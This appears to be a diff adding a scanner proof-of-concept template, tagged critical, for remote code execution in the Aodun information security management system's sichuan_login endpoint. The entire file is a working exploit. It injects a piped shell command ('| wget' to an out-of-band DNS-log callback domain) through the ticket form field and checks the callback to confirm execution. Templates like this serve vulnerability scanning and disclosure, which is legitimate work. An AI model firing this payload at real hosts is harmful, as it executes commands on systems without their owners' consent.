@@ -1,0 +1,21 @@
+id: poc-yaml-aodun-information-security-system-rce
+info:
+  name: 傲盾-信息安全管理系统-sichuan_login-RCE
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - 两高一弱
+  finger: 傲盾-信息安全管理系统
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /user_management/sichuan_login/
+  headers:
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+  data: loginname=sysadmin&ticket=| wget {{.reverseDomain}}
+  expression: status_code == 200 && reverse.Verify()
+transport: http
